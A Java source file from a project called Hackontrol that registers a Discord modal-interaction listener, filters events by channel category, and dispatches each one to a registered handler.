package com.khopan.hackontrol.manager.modal;

import java.util.List;
import java.util.function.Consumer;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.eventlistener.FilteredEventListener;
import com.khopan.hackontrol.manager.Manager;
import com.khopan.hackontrol.registry.RegistrationHandler;
import com.khopan.hackontrol.registry.RegistrationHandler.RegistrationTypeEntry;
import com.khopan.hackontrol.registry.RegistryType;
import com.khopan.hackontrol.utils.DiscordUtils;

import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
import net.dv8tion.jda.api.events.interaction.ModalInteractionEvent;

public class ModalManager implements Manager {
	public static final RegistryType<String, Consumer<ModalContext>> MODAL_REGISTRY = RegistryType.create();

	private List<RegistrationTypeEntry<String, Consumer<ModalContext>>> modalList;

	@Override
	public void configureBuilder(JDABuilder builder) {
		builder.addEventListeners(FilteredEventListener.create(ModalInteractionEvent.class, this :: modalEvent));
	}

	@Override
	public void initialize(RegistrationHandler handler) {
		this.modalList = handler.filterType(ModalManager.MODAL_REGISTRY);
	}

	private void modalEvent(ModalInteractionEvent Event) {
		MessageChannelUnion channel = Event.getChannel();

		if(!DiscordUtils.checkCategory(channel)) {
			return;
		}

		String identifier = Event.getModalId();
		Hackontrol.LOGGER.info("Processing modal: {}", identifier);
		HackontrolChannel hackontrolChannel = Hackontrol.getInstance().getChannel((TextChannel) channel);
		Consumer<ModalContext> action = RegistrationTypeEntry.filter(this.modalList, hackontrolChannel, identifier);

		if(action == null) {
			Hackontrol.LOGGER.warn("Modal {} has null action", identifier);
			return;
		}

		action.accept(new ModalContextImplementation(Event));
	}
}
